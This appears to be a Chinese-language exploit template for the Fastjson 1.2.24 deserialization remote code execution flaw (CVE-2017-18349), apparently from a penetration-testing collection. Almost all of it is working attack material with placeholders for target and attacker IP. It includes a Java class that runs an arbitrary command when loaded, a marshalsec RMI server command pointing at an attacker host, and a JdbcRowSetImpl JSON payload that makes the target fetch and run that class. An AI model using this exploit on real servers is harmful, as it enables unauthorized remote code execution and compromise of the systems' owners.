# Fastjson 1.2.24 Deserialization RCE (CVE-2017-18349)

## 指纹特征
- 服务: 使用 Fastjson 1.2.24 的 Java 应用
- 端口: 8090 (示例)
- 协议: HTTP (JSON 接口)

## 利用矩阵
| 触发方式 | 条件 |
| :--- | :--- |
| JSON 反序列化 (JdbcRowSetImpl) | JDK 版本未开启 JNDI 限制 (如 JDK 8u102 以下) |

## PoC 指令

**1. 准备恶意类 (TouchFile.java)**
```java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"{{COMMAND}}"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {}
    }
}
```
编译：`javac TouchFile.java` 并部署至 HTTP 服务器。

**2. 启动 JNDI 引用服务器**
使用 `marshalsec` 启动 RMI 转发服务：
```bash
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://{{ATTACKER_IP}}/#TouchFile" 9999
```

**3. 发送反序列化 Payload**
```http
POST / HTTP/1.1
Host: {{TARGET}}:8090
Content-Type: application/json

{
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "rmi://{{ATTACKER_IP}}:9999/TouchFile",
        "autoCommit": true
    }
}
```

## Success Signal
- **物理验证**: 命令执行成功（例如：`touch /tmp/success` 后验证文件存在）。
- **连接回显**: RMI 服务器收到来自目标的连接请求。
